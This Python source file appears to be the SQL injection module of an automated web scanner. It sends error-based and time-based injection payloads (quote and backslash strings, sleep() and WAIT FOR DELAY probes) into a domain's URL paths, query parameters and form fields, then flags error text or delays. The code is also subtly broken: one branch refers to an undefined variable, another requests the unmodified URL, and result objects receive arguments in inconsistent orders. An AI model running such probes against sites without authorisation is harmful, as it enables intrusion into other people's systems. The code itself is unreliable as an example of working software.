import urllib.parse as urlparse
from datetime import datetime
from typing import List

from Managers.CacheManager import CacheManager
from Managers.RequestHandler import RequestHandler
from Models.FormRequestDTO import FormRequestDTO
from Models.GetRequestDTO import GetRequestDTO
from Models.SqliFoundDTO import SqliFoundDTO, SqliType


class SqliManager:
    def __init__(self, domain, cookies, headers):
        self._domain = domain
        self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C']
        self._time_based_payloads = [
            {'TruePld': '1\'OR(if(1=1,sleep(5),0))OR\'2', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))OR\'2'},
            {'TruePld': '1\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))--%20'},
            {'TruePld': '1; WAIT FOR DELAY \'00:00:05', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01'},
        ]
        self._delay_in_seconds = 5
        self._request_handler = RequestHandler(cookies, headers)
        self._expected = 'syntax'
        self._single_error_based_payload = '\'"%5C)\\\\'

    def check_get_requests(self, dtos: List[GetRequestDTO]):

        cache_manager = CacheManager('SqliManager', self._domain)
        result = cache_manager.get_saved_result()

        if result is None:
            result: List[SqliFoundDTO] = []
            for dto in dtos:
                self.__check_url(dto, result)
                self.__check_get_params(dto, result)

            cache_manager.save_result(result, has_final_result=True)

        print(f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) SqliManager GET found {len(result)} items')

    def check_form_requests(self, form_results: List[FormRequestDTO]):

        cache_manager = CacheManager('SqliManager/Form', self._domain)
        result = cache_manager.get_saved_result()

        if result is None:
            result: List[SqliFoundDTO] = []

            for item in form_results:
                self.__check_form(item, result)

            cache_manager.save_result(result, has_final_result=True)

        print(f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) Found FORM SQLi: {len(result)}')

    def __check_form(self, dto: FormRequestDTO, result: List[FormRequestDTO]):
        for form in dto.form_params:
            if form.method_type == "POST":
                for param in form.params:
                    copy_form_params = form.params
                    old_param = copy_form_params[param]
                    copy_form_params[param] = self._single_error_based_payload

                    response = self._request_handler.handle_request(dto.url, post_data=copy_form_params)
                    if response is None:
                        continue

                    web_page = response.text
                    if self._expected in web_page or ('exception' in web_page and dto.response_length != len(response.text)):
                        curr_resp_length = len(web_page)
                        if len(result) == 0 or \
                                len(list(filter(lambda dto: dto.response_length == curr_resp_length, result))) < 5:
                            print(f'Found FORM SQLi! url:{dto.url} , param:{param}, action:{form.action}')
                            result.append(SqliFoundDTO(SqliType.FORM_ERROR, dto.url, copy_form_params, web_page))
                        else:
                            print("Duplicate FORM SQLi: - " + url)

                    if str(response.status_code)[0] == '5':
                        print("SqliManager: 500 status - " + url)
                    elif response.status_code == 400:
                        copy_form_params[param] = old_param
            elif form.method_type == "GET":
                parsed = urlparse.urlparse(dto.url)
                url_ending = len(form.action) * -1
                if len(parsed[2]) >= len(form.action) and str(parsed[2])[url_ending:] == form.action:
                    url = f'{parsed[0]}://{parsed[1]}{parsed[2]}?'
                else:
                    url = form.action + '?'
                for param in form.params:
                    prev_url = url
                    url += f'{param}={self._single_error_based_payload}&'

                    response = self._request_handler.handle_request(dto.url)
                    if response is None:
                        continue

                    web_page = response.text
                    if self._expected in web_page:
                        curr_resp_length = len(web_page)
                        if len(result) == 0 or \
                                len(list(filter(lambda dto: dto.response_length == curr_resp_length, result))) < 5:
                            print(f'Found FORM SQLi! url:{url}')
                            result.append(SqliFoundDTO(SqliType.FORM_GET_ERROR, dto.url, param, web_page))
                        else:
                            print("Duplicate FORM SQLi: - " + url)
                    if response.status_code == 400:
                        url = prev_url
            else:
                print("METHOD TYPE NOT FOUND: " + form.method_type)
                return
    def __check_url(self, dto: GetRequestDTO, result: List[SqliFoundDTO]):

        parsed = urlparse.urlparse(dto.url)
        base_url = f'{parsed.scheme}://{parsed.hostname}{parsed.path}/'

        # for payload in self._error_based_payloads:
        #     self.__send_error_based_request(f'{base_url}{payload}', result)

        self.__send_error_based_request(f'{base_url}{self._single_error_based_payload}', result)

        # for payloads in self._time_based_payloads:
        #     self.__send_time_based_request(f'{base_url}{payloads["TruePld"]}', f'{base_url}{payloads["FalsePld"]}',
        #                                    result)

    def __check_get_params(self, dto: GetRequestDTO, result: List[SqliFoundDTO]):
        error_based_payloads_urls = set()
        time_based_payloads_urls = set()
        parsed = urlparse.urlparse(dto.url)
        queries = filter(None, parsed.query.split("&"))

        for query in queries:
            param_split = query.split('=')
            main_url_split = dto.url.split(query)
            # for payloads in self._time_based_payloads:
            #     time_based_payloads_urls.add(
            #         (f'{main_url_split[0]}{param_split[0]}={payloads["TruePld"]}{main_url_split[1]}',
            #          f'{main_url_split[0]}{param_split[0]}={payloads["FalsePld"]}{main_url_split[1]}'))

            error_based_payloads_urls.add(
                f'{main_url_split[0]}{param_split[0]}={self._single_error_based_payload}{main_url_split[1]}')

            # for payload in self._error_based_payloads:
            #     error_based_payloads_urls.add(f'{main_url_split[0]}{param_split[0]}={payload}{main_url_split[1]}')

        for payload in error_based_payloads_urls:
            self.__send_error_based_request(payload, result)

        for payloads in time_based_payloads_urls:
            self.__send_time_based_request(payloads[0], payloads[1], result)

    def __send_error_based_request(self, url, result: List[SqliFoundDTO]):
        try:
            response = self._request_handler.handle_request(url)
            if response is None:
                return
            if response.status_code == 200 or str(response.status_code)[0] == '5':
                if not response.history or response.history[0].status_code != 301:
                    web_page = response.text.lower()
                    if self._expected in web_page:
                        substr_index = web_page.find(self._expected)
                        start_index = substr_index - 50 if substr_index - 50 > 0 else 0
                        last_index = substr_index + 50 if substr_index + 50 < len(web_page) else substr_index
                        log_header_msg = f'injFOUND "{self._expected}":' \
                                         f'STATUS-{response.status_code};' \
                                         f'DETAILS-{web_page[start_index:last_index]};'
                        curr_resp_length = len(web_page)
                        if len(result) == 0 or \
                                len(list(filter(lambda dto: dto.response_length == curr_resp_length, result))) < 5:
                            print(log_header_msg)
                            result.append(SqliFoundDTO(url, SqliType.ERROR, self._single_error_based_payload, web_page))
                        else:
                            print("Duplicate GET SQLI: - " + url)

        except Exception as inst:
            print(f"Exception - ({url}) - {inst}")

    def __send_time_based_request(self, true_payload, false_payload, result: List[SqliFoundDTO]):
        response1 = self._request_handler.handle_request(true_payload)
        if response1 is not None and response1.elapsed.total_seconds() >= self._delay_in_seconds:
            response2 = self._request_handler.handle_request(false_payload)
            if response2 is not None and response2.elapsed.total_seconds() < self._delay_in_seconds:
                response3 = self._request_handler.handle_request(true_payload)
                if response3 is not None and response3.elapsed.total_seconds() >= self._delay_in_seconds:
                    print(f"SQLiManager delay FOUND: - {true_payload} - {false_payload}")
                    return result.append(SqliFoundDTO(SqliType.TIME, true_payload, 'TIME_BASED', response1.text))
